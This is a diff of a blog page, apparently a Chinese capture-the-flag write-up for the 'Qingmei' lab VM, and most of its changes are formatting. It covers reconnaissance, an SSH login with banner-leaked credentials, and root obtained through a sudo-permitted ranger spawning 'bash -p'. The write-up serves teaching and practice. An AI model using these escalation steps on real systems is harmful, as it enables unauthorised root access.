@@ -7,19 +7,15 @@
     <link href='https://7r1umph.top/css/primer.css' rel='stylesheet' />
     <script src='https://7r1umph.top/plugins/theme.js'></script><script src='https://7r1umph.top/plugins/StatsSidebar.js'></script>
     <link rel="icon" href="https://7r1umph.top/image/20250320200557660.ico">
-<meta name="description" content="# 1. 信息收集
+<meta name="description" content="## 1. 信息收集
 
-### 1. 信息收集
-
-#### 1.1 主机发现
+### 1.1 主机发现
 
 使用 `arp-scan` 工具对本地网络 `192.168.205.0/24` 进行扫描，以识别目标主机。">
 <meta property="og:title" content="内部_Qingmei">
-<meta property="og:description" content="# 1. 信息收集
+<meta property="og:description" content="## 1. 信息收集
 
-### 1. 信息收集
-
-#### 1.1 主机发现
+### 1.1 主机发现
 
 使用 `arp-scan` 工具对本地网络 `192.168.205.0/24` 进行扫描，以识别目标主机。">
 <meta property="og:type" content="article">
@@ -92,15 +88,14 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><h1>1. 信息收集</h1>
-<h3>1. 信息收集</h3>
-<h4>1.1 主机发现</h4>
+<div class="markdown-body" id="postBody"><h2>1. 信息收集</h2>
+<h3>1.1 主机发现</h3>
 <p>使用 <code class="notranslate">arp-scan</code> 工具对本地网络 <code class="notranslate">192.168.205.0/24</code> 进行扫描，以识别目标主机。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ sudo arp-scan -l
 [sudo] password <span class="pl-k">for</span> kali:
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
-Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan )
 192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
 192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
 192.168.205.218 08:00:27:83:ca:3c       PCS Systemtechnik GmbH
@@ -109,11 +104,11 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 4 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.10.0: 256 hosts scanned <span class="pl-k">in</span> 1.974 seconds (129.69 hosts/sec). 4 responded</pre></div>
 <p><strong>结果：</strong> 目标主机 IP 地址确认为 <code class="notranslate">192.168.205.218</code>。</p>
-<h4>1.2 端口扫描与服务识别</h4>
-<p>使用 <code class="notranslate">nmap</code> 对目标主机 <code class="notranslate">192.168.205.218</code> 进行全端口 TCP 扫描，并进行服务版本探测。</p>
+<h3>1.2 端口扫描与服务识别</h3>
+<p>使用 <code class="notranslate">nmap</code> 对目标主机 <code class="notranslate">192.168.205.218</code> 进行全端口 TCP 扫描。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nmap -p- --min-rate 10000 192.168.205.218
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 22:55 EDT
+Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-18 22:55 EDT
 Nmap scan report <span class="pl-k">for</span> 192.168.205.218
 Host is up (0.00028s latency).
 Not shown: 65533 closed tcp ports (reset)
@@ -126,7 +121,7 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.12 se
 <p>进一步对开放端口进行服务版本探测：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ nmap -p22,80 -sV 192.168.205.218
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 08:30 EDT 
+Starting Nmap 7.95 ( https://nmap.org  ) at 2025-05-19 08:30 EDT
 Nmap scan report <span class="pl-k">for</span> 192.168.205.218
 Host is up (0.00031s latency).
 
@@ -136,11 +131,11 @@ PORT   STATE SERVICE VERSION
 MAC Address: 08:00:27:83:CA:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Service Info: OS: Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/  <span class="pl-c1">.</span>
 Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 7.85 seconds</pre></div>
-<p><strong>结果：</strong> 目标主机开放了 SSH 服务 (OpenSSH, 端口 22) 和 HTTP 服务 (Apache 2.4.62, 端口 80)。</p>
-<h3>2. 漏洞分析与利用</h3>
-<h4>2.1 Web 服务探测</h4>
+<p><strong>结果：</strong> 目标主机开放了 SSH 服务 (OpenSSH 8.9p1, 端口 22) 和 HTTP 服务 (Apache httpd 2.4.62, 端口 80)。</p>
+<h2>2. 漏洞分析与利用</h2>
+<h3>2.1 Web 服务探测</h3>
 <p>对目标 80 端口的 HTTP 服务进行初步探测。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ curl -v http://192.168.205.218
@@ -190,7 +185,8 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 7.85 se
    <span class="pl-k">&lt;</span>/h<span class="pl-k">1&gt;</span>
 <span class="pl-k">&lt;</span>/pre<span class="pl-k">&gt;</span>
 <span class="pl-k">*</span> Connection</pre></div>
-<p>Web 首页内容为字符画及 QQ 群号，未发现直接可利用信息。使用 <code class="notranslate">dirb</code> 进行目录爆破。</p>
+<p>Web 首页内容为字符画及 QQ 群号，未发现直接可利用信息。</p>
+<p>使用 <code class="notranslate">dirb</code> 进行目录爆破：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ dirb http://192.168.205.218
 
@@ -214,8 +210,8 @@ GENERATED WORDS: 4612
 -----------------
 END_TIME: Sun May 18 23:13:03 2025
 DOWNLOADED: 4612 - FOUND: 2</pre></div>
-<p>目录爆破结果仅发现 <code class="notranslate">index.html</code> 和被禁止访问的 <code class="notranslate">server-status</code>，Web 服务方面未找到明显突破口。</p>
-<h4>2.2 SSH 服务探测与初始访问</h4>
+<p><strong>结果：</strong> 目录爆破仅发现 <code class="notranslate">index.html</code> 和被禁止访问的 <code class="notranslate">server-status</code>。Web 服务方面未找到明显突破口。</p>
+<h3>2.2 SSH 服务探测与初始访问</h3>
 <p>尝试连接 SSH 服务，观察其 Banner 信息。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
 └─$ ssh root@192.168.205.218
@@ -229,19 +225,19 @@ DOWNLOADED: 4612 - FOUND: 2</pre></div>
                 <span class="pl-k">||</span>     <span class="pl-k">||</span>
 root@192.168.205.218<span class="pl-s"><span class="pl-pds">'</span>s password:</span></pre></div>
 <p><strong>发现：</strong> SSH Banner 泄露了凭据 <code class="notranslate">guest/guest</code>。</p>
-<p>使用泄露的凭据 <code class="notranslate">guest:guest</code> 登录 SSH。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">$ ssh guest@192.168.205.218
+<p>使用泄露的凭据 <code class="notranslate">guest:guest</code> 登录 SSH：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ ssh guest@192.168.205.218
 Password: guest
 <span class="pl-c"><span class="pl-c">#</span> 成功登录</span>
 guest@Qingmei:<span class="pl-k">~</span>$ id
 uid=1000(guest) gid=1000(guest) groups=1000(guest)</pre></div>
 <p><strong>结果：</strong> 成功以 <code class="notranslate">guest</code> 用户身份获得对系统的初始访问权限。</p>
-<h3>3. 权限提升</h3>
-<h4>3.1 权限提升：guest -&gt; morri</h4>
+<h2>3. 权限提升</h2>
+<h3>3.1 权限提升：guest -&gt; morri</h3>
 <p>登录后，对 <code class="notranslate">guest</code> 用户进行本地枚举。</p>
-<ul>
-<li>
-<p><strong>家目录检查与 sudo 权限：</strong></p>
+<h4>3.1.1 家目录检查与 sudo 权限</h4>
+<p>查看 <code class="notranslate">guest</code> 用户家目录内容及 <code class="notranslate">sudo</code> 权限：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">guest@Qingmei:<span class="pl-k">~</span>$ ls -la
 total 28
 drwxr-xr-x 2 guest guest 4096 May 18 22:57 <span class="pl-c1">.</span>
@@ -251,22 +247,22 @@ drwxr-xr-x 4 root  root  4096 May 18 09:55 ..
 -rw-r--r-- 1 guest guest 3543 May 18 09:55 .bashrc
 -rw------- 1 guest guest   31 May 18 22:32 .lesshst
 -rw-r--r-- 1 guest guest  807 May 18 09:54 .profile
+
 guest@Qingmei:<span class="pl-k">~</span>$ cat banner
  ____________
 <span class="pl-k">&lt;</span> Are u ok <span class="pl-k">?</span> <span class="pl-k">&gt;</span>
- ------------
+ -------------
         <span class="pl-cce">\ </span>  ^__^
          <span class="pl-cce">\ </span> (oo)<span class="pl-cce">\_</span>______
             (__)<span class="pl-cce">\ </span>      )<span class="pl-cce">\/</span>\
                 <span class="pl-k">||</span>----w <span class="pl-k">|</span>
                 <span class="pl-k">||</span>     <span class="pl-k">||</span>
+
 guest@Qingmei:<span class="pl-k">~</span>$ sudo -l
 [sudo] password <span class="pl-k">for</span> guest: guest
 Sorry, user guest may not run sudo on Qingmei.</pre></div>
-<p><code class="notranslate">guest</code> 用户无 <code class="notranslate">sudo</code> 权限。</p>
-</li>
-<li>
-<p><strong>SUID 文件检查：</strong></p>
+<p><strong>结果：</strong> <code class="notranslate">guest</code> 用户无 <code class="notranslate">sudo</code> 权限。家目录下的 <code class="notranslate">banner</code> 文件内容如上。</p>
+<h4>3.1.2 SUID 文件检查</h4>
 <div class="highlight highlight-source-shell"><pre class="notranslate">guest@Qingmei:<span class="pl-k">~</span>$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
 /usr/bin/chsh
 /usr/bin/chfn
@@ -282,10 +278,8 @@ Sorry, user guest may not run sudo on Qingmei.</pre></div>
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/openssh/ssh-keysign
 /usr/libexec/polkit-agent-helper-1</pre></div>
-<p>未发现非标准的 SUID 可执行文件。</p>
-</li>
-<li>
-<p><strong>检查 <code class="notranslate">/opt</code> 目录：</strong></p>
+<p><strong>结果：</strong> 未发现非标准的 SUID 可执行文件。</p>
+<h4>3.1.3 检查 <code class="notranslate">/opt</code> 目录</h4>
 <div class="highlight highlight-source-shell"><pre class="notranslate">guest@Qingmei:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> /opt/
 guest@Qingmei:/opt$ ls -al
 total 32
@@ -293,13 +287,14 @@ drwxr-xr-x  2 root root  4096 May 18 10:12 <span class="pl-c1">.</span>
 drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
 -rw-r--r--  1 root root   169 May 18 09:53 banner.txt
 -rwx-----x  1 root root 17024 May 18 10:12 morri_password</pre></div>
-<p>在 <code class="notranslate">/opt</code> 目录下发现一个名为 <code class="notranslate">morri_password</code> 的可执行文件，其所有者为 <code class="notranslate">root</code>，但 <code class="notranslate">others</code> 用户组具有执行权限。<br>
-尝试执行该程序并查看帮助信息：</p>
+<p><strong>发现：</strong> 在 <code class="notranslate">/opt</code> 目录下发现一个名为 <code class="notranslate">morri_password</code> 的可执行文件，其所有者为 <code class="notranslate">root</code>，但 <code class="notranslate">guest</code> 用户（属于 <code class="notranslate">others</code>）具有执行权限。</p>
+<p>尝试执行该程序并查看帮助信息：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">guest@Qingmei:/opt$ ./morri_password
 You need to input strings of <span class="pl-s"><span class="pl-pds">'</span>A<span class="pl-pds">'</span></span>s with correct lengths (10-50 characters).
 You<span class="pl-s"><span class="pl-pds">'</span>ll be asked to do this 10 times.</span>
 <span class="pl-s"></span>
 <span class="pl-s">Try 1/10: Please input exactly 26 <span class="pl-pds">'</span></span>A<span class="pl-s"><span class="pl-pds">'</span>s: ^C</span>
+<span class="pl-s"></span>
 <span class="pl-s">guest@Qingmei:/opt$ ./morri_password -h</span>
 <span class="pl-s">Usage: ./program [options]</span>
 <span class="pl-s">Options:</span>
@@ -309,55 +304,52 @@ You<span class="pl-s"><span class="pl-pds">'</span>ll be asked to do this 10 tim
 <span class="pl-s">Normal operation:</span>
 <span class="pl-s">  The program will ask you to input strings of <span class="pl-pds">'</span></span>A<span class="pl-s"><span class="pl-pds">'</span>s with random lengths (10-50)</span>
 <span class="pl-s">  You need to correctly input 10 times to get the credentials</span></pre></div>
-<p>发现 <code class="notranslate">--dashazi</code> 选项可以直接输出凭据。</p>
-</li>
-<li>
-<p><strong>获取 <code class="notranslate">morri</code> 用户凭据：</strong><br>
-使用 <code class="notranslate">--dashazi</code> 选项执行程序。</p>
+<p><strong>发现：</strong> 程序存在 <code class="notranslate">--dashazi</code> 选项可以直接输出凭据。</p>
+<h4>3.1.4 获取 <code class="notranslate">morri</code> 用户凭据</h4>
+<p>使用 <code class="notranslate">--dashazi</code> 选项执行程序：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">guest@Qingmei:/opt$ ./morri_password --dashazi
 user:morri pass:morri</pre></div>
-<p>成功获取用户 <code class="notranslate">morri</code> 的凭据为 <code class="notranslate">morri:morri</code>。</p>
-</li>
-<li>
-<p><strong>切换至 <code class="notranslate">morri</code> 用户并获取 <code class="notranslate">user.txt</code>：</strong></p>
+<p><strong>结果：</strong> 成功获取用户 <code class="notranslate">morri</code> 的凭据为 <code class="notranslate">morri:morri</code>。</p>
+<h4>3.1.5 切换至 <code class="notranslate">morri</code> 用户并获取 <code class="notranslate">user.txt</code></h4>
 <div class="highlight highlight-source-shell"><pre class="notranslate">guest@Qingmei:/opt$ su morri
-Password: morri
+Password: morri <span class="pl-c"><span class="pl-c">#</span> 输入密码 morri</span>
 morri@Qingmei:/opt$ id
 uid=1001(morri) gid=1001(morri) groups=1001(morri)
 morri@Qingmei:/opt$ <span class="pl-c1">cd</span> <span class="pl-k">~</span>
 morri@Qingmei:<span class="pl-k">~</span>$ cat user.txt
 flag{user-edf050af-33ef-11f0-b3f0-000c2955ba04}</pre></div>
-<p>成功切换到 <code class="notranslate">morri</code> 用户并读取 <code class="notranslate">user.txt</code>，获取第一个 flag。</p>
-</li>
-</ul>
-<h4>3.2 权限提升：morri -&gt; root</h4>
-<ul>
-<li>
-<p><strong>Sudo 权限检查 (morri)：</strong><br>
-检查 <code class="notranslate">morri</code> 用户的 <code class="notranslate">sudo</code> 权限。</p>
+<p><strong>结果：</strong> 成功切换到 <code class="notranslate">morri</code> 用户并读取 <code class="notranslate">user.txt</code>，获取第一个 flag。</p>
+<h3>3.2 权限提升：morri -&gt; root</h3>
+<h4>3.2.1 Sudo 权限检查 (morri)</h4>
+<p>检查 <code class="notranslate">morri</code> 用户的 <code class="notranslate">sudo</code> 权限：</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">morri@Qingmei:<span class="pl-k">~</span>$ sudo -l
 Matching Defaults entries <span class="pl-k">for</span> morri on Qingmei:
     env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
 
 User morri may run the following commands on Qingmei:
     (ALL) NOPASSWD: /usr/bin/ranger</pre></div>
-<p><code class="notranslate">morri</code> 用户可以无密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/usr/bin/ranger</code>。</p>
+<p><strong>发现：</strong> <code class="notranslate">morri</code> 用户可以无密码以 <code class="notranslate">root</code> 权限执行 <code class="notranslate">/usr/bin/ranger</code>。</p>
+<h4>3.2.2 利用 <code class="notranslate">ranger</code> 提权</h4>
+<p><code class="notranslate">ranger</code> 是一个终端文件管理器，可以通过其内置的 shell 执行功能来获取 <code class="notranslate">root</code> shell。</p>
+<ol>
+<li>
+<p>执行 <code class="notranslate">sudo /usr/bin/ranger</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">morri@Qingmei:<span class="pl-k">~</span>$ sudo /usr/bin/ranger</pre></div>
 </li>
 <li>
-<p><strong>利用 <code class="notranslate">ranger</code> 提权：</strong><br>
-<code class="notranslate">ranger</code> 是一个终端文件管理器，可以通过其内置的 shell 执行功能来获取 <code class="notranslate">root</code> shell。<br>
-执行 <code class="notranslate">sudo /usr/bin/ranger</code>。在 <code class="notranslate">ranger</code> 界面中，按下 <code class="notranslate">s</code> 键，然后输入 <code class="notranslate">bash -p</code> 并执行。参数 <code class="notranslate">-p</code> 确保 <code class="notranslate">bash</code> 以特权模式启动，从而继承 <code class="notranslate">sudo</code> 赋予的 <code class="notranslate">root</code> 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">morri@Qingmei:<span class="pl-k">~</span>$ sudo /usr/bin/ranger
-<span class="pl-c"><span class="pl-c">#</span> 此处进入 ranger 界面</span>
-<span class="pl-c"><span class="pl-c">#</span> 在 ranger 界面中按 's' 键 (或 ':')，然后输入 'bash -p' (或 'sh -p') 并回车</span></pre></div>
-<p>执行后，成功返回一个 <code class="notranslate">root</code> shell。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@Qingmei:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
-uid=0(root) gid=0(root) groups=0(root)
-root@Qingmei:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt </span>
-flag{root-485ee7a8-33f0-11f0-afbc-000c2955ba04}</pre></div>
-<p>成功获取 <code class="notranslate">root</code> 权限。</p>
+<p>在 <code class="notranslate">ranger</code> 界面中，按下 <code class="notranslate">s</code> 键 (或 <code class="notranslate">:</code>) 进入命令模式。</p>
 </li>
-</ul></div>
+<li>
+<p>输入 <code class="notranslate">bash -p</code> (或 <code class="notranslate">sh -p</code>) 并回车。参数 <code class="notranslate">-p</code> 确保 <code class="notranslate">bash</code> 以特权模式（effective UID as root）启动。</p>
+</li>
+</ol>
+<p>执行后，成功返回一个 <code class="notranslate">root</code> shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 此处已是 root shell</span>
+root@Qingmei:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root)
+root@Qingmei:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt</span>
+flag{root-485ee7a8-33f0-11f0-afbc-000c2955ba04}</pre></div>
+<p><strong>结果：</strong> 成功获取 <code class="notranslate">root</code> 权限并读取 <code class="notranslate">root.txt</code>，获取第二个 flag。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
